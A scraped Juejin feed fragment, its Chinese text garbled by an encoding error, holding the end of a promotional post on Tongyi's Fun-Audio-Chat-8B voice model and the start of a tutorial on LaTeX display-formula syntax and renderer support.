<p>è¿™ç§æ”¹å˜å¸¦æ¥çš„ä½“éªŒå‡çº§æ˜¯è´¨çš„ã€‚æ²¡æœ‰äº†ä¸­é—´å•†èµšå·®ä»·ï¼Œå»¶è¿Ÿè¢«å‹åˆ°äº†æä½ã€‚è€Œä¸”å®ƒæ”¯æŒâ€œå…¨åŒå·¥äº¤äº’â€ï¼Œä½ å¯ä»¥åƒè·ŸçœŸäººèŠå¤©ä¸€æ ·éšæ—¶æ‰“æ–­å®ƒï¼Œå®ƒä¹Ÿèƒ½ä¸€è¾¹å¬ä¸€è¾¹æƒ³ä¸€è¾¹è¯´ã€‚è¿™ç§â€œè¾¹å¬è¾¹è¯´â€çš„èƒ½åŠ›ï¼Œæ‰æ˜¯é€šä¹‰è¿™ä¸ªæ–°æ¨¡å‹æœ€å“äººçš„åœ°æ–¹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-02_21.59.03-1024x601.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-02_21.59.03-1024x601.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11bc14268eb54304914c3f0e153b510f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767967639&amp;x-signature=D%2FQaGjw7nnR%2FQuvz8EitCIkLspc%3D" alt="iShot_2026-01-02_21.59.03" loading="lazy"/></a></p>
<p><strong>èªæ˜çš„â€œåŒåˆ†è¾¨ç‡â€è®¾è®¡</strong></p>
<p>ä½ å¯èƒ½ä¼šæ‹…å¿ƒï¼Œç›´æ¥å¤„ç†éŸ³é¢‘æ•°æ®ï¼Œç®—åŠ›æ‰›å¾—ä½å—ï¼Ÿ</p>
<p>è¿™å°±è¦æåˆ°é€šä¹‰å›¢é˜Ÿè¿™æ¬¡æçš„ä¸€ä¸ªå¾ˆéªšçš„æ“ä½œï¼š<strong>åŒåˆ†è¾¨ç‡æ¶æ„</strong>ã€‚</p>
<p>ä»–ä»¬å‘ç°ï¼Œäººç±»è¯´è¯çš„è¯­é€Ÿå…¶å®å¹¶ä¸å¿«ï¼Œä½†å£°éŸ³çš„ç»†èŠ‚ï¼ˆéŸ³è‰²ã€æƒ…æ„Ÿï¼‰éœ€è¦é«˜é‡‡æ ·ç‡ã€‚äºæ˜¯ä»–ä»¬è®©æ¨¡å‹çš„å¤§è„‘ï¼ˆLLMå±‚ï¼‰ä»¥5Hzçš„ä½å¸§ç‡å»å¤„ç†è¯­ä¹‰ï¼ŒçœåŠ²åˆå¿«ï¼›ç„¶åä¸“é—¨é…äº†ä¸€ä¸ªâ€œè¯­éŸ³é‡åˆæˆå¤´â€ï¼Œä»¥25Hzçš„é«˜å¸§ç‡å»è¿˜åŸå£°éŸ³ç»†èŠ‚ã€‚</p>
<p>ç»“æœå°±æ˜¯ï¼Œè¿™ç©æ„å„¿æ¯”åŸæœ¬çš„æ–¹æ¡ˆçœäº†è¿‘50%çš„GPUè®¡ç®—å¼€é”€ã€‚å¯¹äºæƒ³åœ¨æœ¬åœ°éƒ¨ç½²ï¼ˆæ¯”å¦‚ä½ æœ‰ä¸€å¼ RTX 3090æˆ–4090ï¼‰çš„å¼€å‘è€…æ¥è¯´ï¼Œè¿™ç®€ç›´æ˜¯ç¦éŸ³ã€‚</p>
<p><strong>å®ƒçœŸçš„æ‡‚ä½ çš„æƒ…ç»ª</strong></p>
<p>é™¤äº†å¿«ï¼ŒFun-Audio-Chatæœ€è®©æˆ‘æƒŠå–œçš„æ˜¯å®ƒçš„â€œæƒ…å•†â€ã€‚</p>
<p>ä»¥å‰çš„è¯­éŸ³åŠ©æ‰‹å…¨æ˜¯è«å¾—æ„Ÿæƒ…çš„è¯»ç¨¿æœºå™¨ã€‚ä½†Fun-Audio-Chatå¼•å…¥äº†<strong>Core-Cocktailè®­ç»ƒç­–ç•¥</strong>ï¼Œåœ¨ä¿ç•™å¼ºå¤§æ–‡æœ¬é€»è¾‘çš„åŒæ—¶ï¼Œç–¯è¡¥äº†ç™¾ä¸‡å°æ—¶çš„è¯­éŸ³æ•°æ®ã€‚</p>
<p>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿæ„å‘³ç€å®ƒä¸éœ€è¦ä½ æ‰“å­—å¤‡æ³¨[æ‚²ä¼¤]ï¼Œå…‰å¬ä½ è¯´è¯çš„è¯­æ°”ã€åœé¡¿ã€å¹æ°”ï¼Œå®ƒå°±èƒ½getåˆ°ä½ çš„æƒ…ç»ªã€‚å®ƒä¼šæ ¹æ®ä½ çš„çŠ¶æ€ï¼Œè°ƒæ•´è‡ªå·±çš„è¯­è°ƒæ¥å®‰æ…°ä½ æˆ–è€…é™ªä½ å¼€å¿ƒã€‚è¿™ç§æ— æç¤ºçš„æƒ…ç»ªæ„ŸçŸ¥ï¼Œæ‰æ˜¯é€šä¹‰ç™¾è†æƒ³åšçš„â€œAIè¯­éŸ³æ­å­â€ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-02_21.59.17.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-02_21.59.17.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fba0a677a69440acb712c06a99ad2f23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767967639&amp;x-signature=r5%2Bz343AtaD5defB18eT2ESWNpw%3D" alt="iShot_2026-01-02_21.59.17" loading="lazy"/></a></p>
<p><strong>ä¸ä»…èƒ½èŠï¼Œè¿˜èƒ½å¹²æ´»</strong></p>
<p>åˆ«ä»¥ä¸ºå®ƒåªæ˜¯ä¸ªèŠå¤©æœºå™¨äººã€‚åœ¨<strong>è¯­éŸ³åŠŸèƒ½è°ƒç”¨</strong>è¿™å—ï¼Œå®ƒä¹Ÿåšå¾—ç›¸å½“æ‰å®ã€‚ä½ å¯ä»¥ç›´æ¥ç”¨å¤§ç™½è¯è®©å®ƒâ€œæ”¾é¦–è½»æ¾çš„æ­Œï¼Œé¡ºä¾¿æŸ¥æŸ¥å»æœºåœºå µä¸å µâ€ï¼Œå®ƒèƒ½ç›´æ¥è°ƒç”¨å‡½æ•°å»æ‰§è¡Œï¼Œè€Œä¸æ˜¯å‚»å‚»åœ°å›ä½ ä¸€å¥â€œæˆ‘ä¸æ˜ç™½æ‚¨çš„æ„æ€â€ã€‚</p>
<p><strong>å®æµ‹æˆç»©å•</strong></p>
<p>åœ¨è¿™ä¸ªåœˆå­ï¼Œå…‰å¹æŠ€æœ¯æ²¡ç”¨ï¼Œè¿˜å¾—çœ‹è·‘åˆ†ã€‚</p>
<p>åœ¨OpenAudioBenchã€MMAUè¿™äº›ç¡¬æ ¸è¯„æµ‹é‡Œï¼ŒFun-Audio-Chat-8Bé¢å¯¹åŒå°ºå¯¸ï¼ˆ8Bï¼‰çš„ç«å“ï¼Œæ¯”å¦‚GLM4-Voiceå’ŒKimi-Audioï¼Œå‡ ä¹æ˜¯å‹å€’æ€§çš„ä¼˜åŠ¿ã€‚ç‰¹åˆ«æ˜¯åœ¨è¯­éŸ³ç†è§£å’Œç”Ÿæˆè´¨é‡ä¸Šï¼Œå®ƒç¡®å®æ‹¿å‡ºäº†æ¦œä¸€å¤§å“¥çš„å®åŠ›ã€‚</p>
<p><strong>å†™åœ¨æœ€å</strong></p>
<p>ç›®å‰ï¼ŒFun-Audio-Chat-8Bçš„æƒé‡ã€æ¨ç†ä»£ç éƒ½å·²ç»æ‰”åˆ°äº†Hugging Faceã€é­”æ­ç¤¾åŒºå’ŒGitHubä¸Šã€‚</p>
<p>å¦‚æœä½ æ˜¯ä¸€ä¸ªå¯¹è¯­éŸ³äº¤äº’æœ‰æ‰§å¿µçš„å¼€å‘è€…ï¼Œæˆ–è€…æƒ³ç»™è‡ªå·±çš„åº”ç”¨åŠ ä¸Šä¸€ä¸ªçœŸçš„â€œåƒäººâ€çš„è¯­éŸ³æ¥å£ï¼Œè¿™ä¸ªæ¨¡å‹ç»å¯¹å€¼å¾—ä½ å»è·‘ä¸€ä¸‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-02_21.59.49-1024x307.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-02_21.59.49-1024x307.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e944eca920164173a62d33be1d7c53c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767967639&amp;x-signature=SszNbSIskB71k4b0xbBgDerhHgw%3D" alt="iShot_2026-01-02_21.59.49" loading="lazy"/></a></p>
<p>2025å¹´çš„å°¾å·´ï¼Œé€šä¹‰ä¸ä»…å·äº†æŠ€æœ¯ï¼Œè¿˜æŠŠé—¨æ§›ç»™æ‰“ä¸‹æ¥äº†ã€‚è¯­éŸ³äº¤äº’çš„iPhoneæ—¶åˆ»ï¼Œå¯èƒ½çœŸçš„ä¸è¿œäº†ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[latex-å…¬å¼å†™æ³•]]></title>    <link>https://juejin.cn/post/7590020026395312182</link>    <guid>https://juejin.cn/post/7590020026395312182</guid>    <pubDate>2026-01-02T14:20:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026395312182" data-draft-id="7590020026395295798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="latex-å…¬å¼å†™æ³•"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-02T14:20:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‡ªç”±ç”Ÿé•¿2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            latex-å…¬å¼å†™æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‡ªç”±ç”Ÿé•¿2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T14:20:19.000Z" title="Fri Jan 02 2026 14:20:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0"><strong>ä¸€ã€LaTeX æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h4>
<p>LaTeX æ˜¯ä¸€ç§ä¸“ä¸šçš„<strong>æ–‡æ¡£æ’ç‰ˆç³»ç»Ÿ</strong>ï¼Œå°¤å…¶åœ¨æ•°å­¦ã€ç‰©ç†ã€è®¡ç®—æœºç§‘å­¦ç­‰é¢†åŸŸè¢«å¹¿æ³›ç”¨äºç¼–å†™åŒ…å«å¤æ‚å…¬å¼çš„è®ºæ–‡ã€ä¹¦ç±å’Œæ¼”ç¤ºæ–‡ç¨¿ã€‚å®ƒçš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯å¯ä»¥ç”¨<strong>ä»£ç </strong>æ¥ç”Ÿæˆç¾è§‚ã€ç²¾ç¡®çš„æ•°å­¦å…¬å¼ã€‚</p>
<hr/>
<h4 data-id="heading-1"><strong>äºŒã€è¿™æ®µ LaTeX ä»£ç çš„è§£è¯»</strong></h4>
<p>è¿™æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-latex" lang="latex">\[
\text{æŒ‡æ•°} = \frac{80}{114.2857} \times 1000 \approx 700 \text{ç‚¹}
\]
</code></pre>
<p><strong>æ¸²æŸ“ï¼ˆæ˜¾ç¤ºï¼‰å‡ºæ¥çš„æ•ˆæœå°±æ˜¯ï¼š</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>æŒ‡æ•°</mtext><mo>=</mo><mfrac><mn>80</mn><mn>114.2857</mn></mfrac><mo>Ã—</mo><mn>1000</mn><mo>â‰ˆ</mo><mn>700</mn><mtext>ç‚¹</mtext></mrow><annotation encoding="application/x-tex">\text{æŒ‡æ•°} = \frac{80}{114.2857} \times 1000 \approx 700 \text{ç‚¹}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord cjk_fallback">æŒ‡æ•°</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">114.2857</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">80</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">700</span><span class="mord text"><span class="mord cjk_fallback">ç‚¹</span></span></span></span></span></span></div>
<hr/>
<h4 data-id="heading-2"><strong>ä¸‰ã€ä»£ç ç»“æ„è§£æ</strong></h4>
<ol>
<li>
<p><code>\[</code> å’Œ <code>\]</code>ï¼š</p>
<ul>
<li>è¿™æ˜¯ LaTeX ä¸­è¡¨ç¤º<strong>ç‹¬ç«‹æ˜¾ç¤ºå…¬å¼</strong>çš„ç¬¦å·ã€‚å…¬å¼ä¼šå•ç‹¬å±…ä¸­æ˜¾ç¤ºåœ¨ä¸€è¡Œã€‚</li>
</ul>
</li>
<li>
<p><code>\text{æŒ‡æ•°}</code>ï¼š</p>
<ul>
<li><code>\text{}</code> å‘½ä»¤ç”¨äºåœ¨å…¬å¼ä¸­æ’å…¥<strong>æ­£å¸¸æ–‡æœ¬</strong>ï¼ˆè€Œä¸æ˜¯æ•°å­¦æ–œä½“ï¼‰ã€‚</li>
<li>è¿™é‡Œæ˜¯ä¸ºäº†åœ¨å…¬å¼ä¸­æ˜¾ç¤ºä¸­æ–‡â€œæŒ‡æ•°â€ä¸¤ä¸ªå­—ã€‚</li>
</ul>
</li>
<li>
<p><code>\frac{80}{114.2857}</code>ï¼š</p>
<ul>
<li><code>\frac{åˆ†å­}{åˆ†æ¯}</code> æ˜¯ LaTeX ä¸­åˆ›å»º<strong>åˆ†æ•°</strong>çš„å‘½ä»¤ã€‚</li>
<li>è¿™é‡Œç”Ÿæˆåˆ†æ•°ï¼šåˆ†å­æ˜¯ 80ï¼Œåˆ†æ¯æ˜¯ 114.2857ã€‚</li>
</ul>
</li>
<li>
<p><code>\times</code>ï¼š</p>
<ul>
<li>ç”Ÿæˆä¹˜å· â€œÃ—â€ã€‚</li>
</ul>
</li>
<li>
<p><code>\approx</code>ï¼š</p>
<ul>
<li>ç”Ÿæˆçº¦ç­‰å· â€œâ‰ˆâ€ã€‚</li>
</ul>
</li>
<li>
<p><code>\text{ç‚¹}</code>ï¼š</p>
<ul>
<li>åŒä¸Šï¼Œåœ¨å…¬å¼æœ«å°¾æ·»åŠ ä¸­æ–‡â€œç‚¹â€å­—ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-3"><strong>å››ã€ä¸ºä»€ä¹ˆåœ¨å¯¹è¯ä¸­ä½¿ç”¨ LaTeXï¼Ÿ</strong></h4>
<p>åœ¨è§£é‡Š<strong>æ•°å­¦å…¬å¼ã€é‡‘èè®¡ç®—ã€ç§‘å­¦åŸç†</strong>æ—¶ï¼ŒLaTeX æ˜¯æœ€æ¸…æ™°ã€æœ€å‡†ç¡®çš„æ–¹å¼ã€‚å®ƒèƒ½ç¡®ä¿ï¼š</p>
<ul>
<li>å…¬å¼ç»“æ„ï¼ˆå¦‚åˆ†æ•°ã€ä¸Šä¸‹æ ‡ï¼‰å‡†ç¡®æ— è¯¯ã€‚</li>
<li>æ’ç‰ˆä¸“ä¸šç¾è§‚ï¼Œæ˜“äºé˜…è¯»å’Œç†è§£ã€‚</li>
<li>æ˜¯å­¦æœ¯å’ŒæŠ€æœ¯äº¤æµçš„é€šç”¨æ ‡å‡†ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-4"><strong>äº”ã€å¦‚ä½•çœ‹åˆ°æ¸²æŸ“åçš„å…¬å¼ï¼Ÿ</strong></h4>
<ul>
<li><strong>åœ¨æ”¯æŒ LaTeX çš„å¹³å°ä¸Š</strong>ï¼ˆå¦‚ Stack Exchangeã€Jupyter Notebookã€Overleafã€Obsidian ç­‰ï¼‰ï¼Œè¿™æ®µä»£ç ä¼šè‡ªåŠ¨æ¸²æŸ“æˆæ‚¨çœ‹åˆ°çš„æ¼‚äº®å…¬å¼ã€‚</li>
<li><strong>åœ¨ä¸æ”¯æŒçš„ç¯å¢ƒä¸‹</strong>ï¼ˆå¦‚çº¯æ–‡æœ¬èŠå¤©ï¼‰ï¼Œå®ƒåˆ™ä¼šä»¥ä»£ç å½¢å¼æ˜¾ç¤ºã€‚ä¸è¿‡ï¼Œç°åœ¨å¾ˆå¤šAIåŠ©æ‰‹ï¼ˆåŒ…æ‹¬æˆ‘ï¼‰å’Œé«˜çº§ç¬”è®°è½¯ä»¶éƒ½å†…ç½®äº† LaTeX æ¸²æŸ“å¼•æ“ï¼Œå¯ä»¥ç›´æ¥æ˜¾ç¤ºå…¬å¼ã€‚</li>
</ul>
<p>æ‰€æœ‰åŒ…å« <code>\[ ... \]</code> æˆ– <code>$$ ... $$</code> çš„æ•°å­¦å…¬å¼ï¼Œéƒ½æ˜¯ç”¨ LaTeX ç¼–å†™çš„ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸å¥½ä¸”å®ç”¨çš„çŸ¥è¯†äº¤æµå·¥å…·ã€‚</p>
<h2 data-id="heading-5">æ–°è€ç‰ˆæœ¬</h2>
<p>æœ‰çš„æ¸²æŸ“å™¨åªæ”¯æŒ $$ï¼Œä¸æ”¯æŒ <code>\[ \]</code>ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªåœ¨å®é™…ä½¿ç”¨ä¸­ç»å¸¸é‡åˆ°çš„å…¼å®¹æ€§é—®é¢˜ã€‚</p>
<hr/>
<h4 data-id="heading-6"><strong>ä¸€ã€ç°çŠ¶ä¸åŒºåˆ«</strong></h4>
<ol>
<li>
<p><strong><code>$$ ... $$</code></strong>ï¼ˆç»å…¸TeXæ ¼å¼ï¼‰</p>
<ul>
<li>è¿™æ˜¯æœ€å¤è€ã€æœ€ç»å…¸çš„TeXæ•°å­¦ç¯å¢ƒã€‚</li>
<li>å‡ ä¹<strong>æ‰€æœ‰</strong>æ”¯æŒLaTeXçš„æ¸²æŸ“å™¨éƒ½å…¼å®¹å®ƒã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šåœ¨æ­£å¼LaTeXæ–‡æ¡£ä¸­ï¼Œå®ƒä¸è¢«æ¨èä¸ºé¦–é€‰ï¼ˆå¯èƒ½äº§ç”Ÿä¸ä¸€è‡´çš„é—´è·ï¼‰ï¼Œä½†åœ¨ç½‘é¡µã€Markdownç­‰åœºæ™¯ä¸­åº”ç”¨æå¹¿ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>\[ ... \]</code></strong>ï¼ˆLaTeXæ ‡å‡†æ ¼å¼ï¼‰</p>
<ul>
<li>è¿™æ˜¯LaTeX2çš„æ ‡å‡†è¯­æ³•ï¼Œç”¨äºåˆ›å»ºæ— ç¼–å·çš„æ˜¾ç¤ºå…¬å¼ã€‚</li>
<li>åœ¨<strong>å®Œæ•´çš„LaTeXæ–‡æ¡£</strong>ï¼ˆå¦‚.texæ–‡ä»¶ï¼‰ä¸­æ˜¯é¦–é€‰ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šä¸€äº›<strong>è¾ƒæ—§æˆ–ç®€åŒ–çš„æ¸²æŸ“å™¨</strong>ï¼ˆå°¤å…¶æ˜¯æŸäº›Markdownè§£æå™¨ã€æ—§ç‰ˆç½‘ç«™ï¼‰å¯èƒ½ä¸æ”¯æŒå®ƒã€‚</li>
</ul>
</li>
</ol>
<p>æ¯”å¦‚æ˜é‡‘ç½‘ç«™å°±ä¸æ”¯æŒï¼</p>
<hr/>
<h4 data-id="heading-7"><strong>äºŒã€å¸¸è§åœºæ™¯æ”¯æŒåº¦</strong></h4>



























































<table><thead><tr><th align="left">ç¯å¢ƒ/å¹³å°</th><th align="left">é€šå¸¸æ”¯æŒ <code>$$</code></th><th align="left">é€šå¸¸æ”¯æŒ <code>\[ \]</code></th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>æ ‡å‡†LaTeXç¼–è¯‘å™¨</strong> (pdfLaTeX, XeLaTeX)</td><td align="left">âœ…ï¼ˆä½†ä¸æ¨èï¼‰</td><td align="left">âœ…ï¼ˆé¦–é€‰ï¼‰</td><td align="left">ä¸¤è€…éƒ½å·¥ä½œï¼Œä½†åè€…æ˜¯æ ‡å‡†</td></tr><tr><td align="left"><strong>MathJaxï¼ˆé»˜è®¤é…ç½®ï¼‰</strong></td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">ä¸¤è€…éƒ½æ”¯æŒ</td></tr><tr><td align="left"><strong>KaTeX</strong></td><td align="left">âœ…</td><td align="left">âœ…ï¼ˆéœ€ç¡®è®¤é…ç½®ï¼‰</td><td align="left">ä¸¤è€…éƒ½æ”¯æŒï¼Œä½†<code>$$</code>æœ€ç¨³å¦¥</td></tr><tr><td align="left"><strong>GitHub Flavored Markdown</strong></td><td 